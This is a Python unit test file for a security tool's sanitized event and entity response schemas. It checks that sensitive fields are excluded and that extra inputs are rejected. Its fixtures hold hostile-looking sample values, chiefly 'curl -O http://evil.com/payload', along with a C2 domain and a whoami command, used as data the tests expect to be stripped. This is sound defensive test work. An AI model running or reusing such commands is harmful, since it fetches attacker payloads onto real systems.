"""
Unit tests for Sanitized Event & Entity Response Projections.

Provably offline tests verifying:
- Explicit field allowlist for SanitizedNormalizedEventSummary (Decision 1A)
  - Must exclude normalized_payload
  - Must exclude raw_evidence_id
  - Rejects extra fields (extra="forbid")
- Explicit field allowlist for SanitizedExtractedEntityItem
  - Must exclude event_id, raw_evidence_id, attributes, case_id
  - Rejects extra fields (extra="forbid")
- Safe projection from full internal models and dictionaries
"""

from __future__ import annotations

import uuid
from datetime import datetime, timezone
import pytest
from pydantic import ValidationError

from app.schemas.query import (
    ExtractedEntityItem,
    NormalizedEventSummary,
    SanitizedExtractedEntityItem,
    SanitizedNormalizedEventSummary,
)


class TestSanitizedNormalizedEventSummary:
    def test_allowlisted_fields_present_and_clean(self):
        event_id = uuid.uuid4()
        now = datetime.now(timezone.utc)
        sanitized = SanitizedNormalizedEventSummary(
            id=event_id,
            event_id="1",
            event_type="process_creation",
            event_timestamp=now,
            provider="Microsoft-Windows-Sysmon",
            action="Process Create",
            outcome="success",
            severity="medium",
            source_type="sysmon",
            source_identifier="WORKSTATION-01",
        )
        data = sanitized.model_dump()
        expected_keys = {
            "id",
            "event_id",
            "event_type",
            "event_timestamp",
            "provider",
            "action",
            "outcome",
            "severity",
            "source_type",
            "source_identifier",
            # Added 2026-11-22 on purpose: a timestamp only (when AISOP ingested the record), already returned to the same
            # roles by the alert endpoints. Needed to show event time and ingestion time side by side.
            "raw_ingested_at",
        }
        assert set(data.keys()) == expected_keys
        # Explicit exclusion of sensitive unredacted fields
        assert "normalized_payload" not in data
        assert "raw_evidence_id" not in data

    def test_rejects_normalized_payload_inclusion(self):
        event_id = uuid.uuid4()
        now = datetime.now(timezone.utc)
        with pytest.raises(ValidationError, match="Extra inputs are not permitted"):
            SanitizedNormalizedEventSummary(
                id=event_id,
                event_id="1",
                event_type="process_creation",
                event_timestamp=now,
                provider="Microsoft-Windows-Sysmon",
                action="Process Create",
                outcome="success",
                severity="medium",
                normalized_payload={"CommandLine": "cmd.exe /c whoami"},  # FORBIDDEN!
            )

    def test_rejects_raw_evidence_id_inclusion(self):
        event_id = uuid.uuid4()
        now = datetime.now(timezone.utc)
        with pytest.raises(ValidationError, match="Extra inputs are not permitted"):
            SanitizedNormalizedEventSummary(
                id=event_id,
                event_id="1",
                event_type="process_creation",
                event_timestamp=now,
                provider="Microsoft-Windows-Sysmon",
                action="Process Create",
                outcome="success",
                severity="medium",
                raw_evidence_id=uuid.uuid4(),  # FORBIDDEN!
            )

    def test_projection_from_full_internal_summary(self):
        now = datetime.now(timezone.utc)
        full_summary = NormalizedEventSummary(
            id=uuid.uuid4(),
            raw_evidence_id=uuid.uuid4(),
            event_id="4624",
            event_type="user_logon",
            event_timestamp=now,
            provider="Security",
            action="Logon",
            outcome="success",
            severity="low",
            source_type="wineventlog",
            source_identifier="DC-01",
            normalized_payload={"TargetUserName": "admin", "LogonType": 10},
        )

        sanitized = SanitizedNormalizedEventSummary.from_event_summary(full_summary)
        data = sanitized.model_dump()
        assert data["id"] == full_summary.id
        assert data["event_id"] == "4624"
        assert "normalized_payload" not in data
        assert "raw_evidence_id" not in data


class TestSanitizedExtractedEntityItem:
    def test_allowlisted_fields_present_and_clean(self):
        entity_id = uuid.uuid4()
        sanitized = SanitizedExtractedEntityItem(
            id=entity_id,
            entity_type="ip",
            entity_value="198.51.100.45",
            role="destination",
        )
        data = sanitized.model_dump()
        expected_keys = {"id", "entity_type", "entity_value", "role"}
        assert set(data.keys()) == expected_keys
        # Explicit exclusions
        assert "event_id" not in data
        assert "raw_evidence_id" not in data
        assert "attributes" not in data
        assert "case_id" not in data

    def test_rejects_attributes_inclusion(self):
        with pytest.raises(ValidationError, match="Extra inputs are not permitted"):
            SanitizedExtractedEntityItem(
                id=uuid.uuid4(),
                entity_type="ip",
                entity_value="198.51.100.45",
                role="destination",
                attributes={"command_line": "curl -O http://evil.com/payload"},  # FORBIDDEN!
            )

    def test_rejects_case_id_inclusion(self):
        with pytest.raises(ValidationError, match="Extra inputs are not permitted"):
            SanitizedExtractedEntityItem(
                id=uuid.uuid4(),
                entity_type="domain",
                entity_value="c2.attacker.com",
                role="ioc",
                case_id=uuid.uuid4(),  # FORBIDDEN! Prevents cross-case leakage
            )

    def test_projection_from_full_extracted_entity(self):
        full_entity = ExtractedEntityItem(
            id=uuid.uuid4(),
            event_id=uuid.uuid4(),
            raw_evidence_id=uuid.uuid4(),
            entity_type="file_hash",
            entity_value="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            role="sha256",
            attributes={"filepath": "C:\\Windows\\System32\\malware.exe"},
        )

        sanitized = SanitizedExtractedEntityItem.from_entity_item(full_entity)
        data = sanitized.model_dump()
        assert data["id"] == full_entity.id
        assert data["entity_value"] == full_entity.entity_value
        assert "attributes" not in data
        assert "event_id" not in data
        assert "raw_evidence_id" not in data
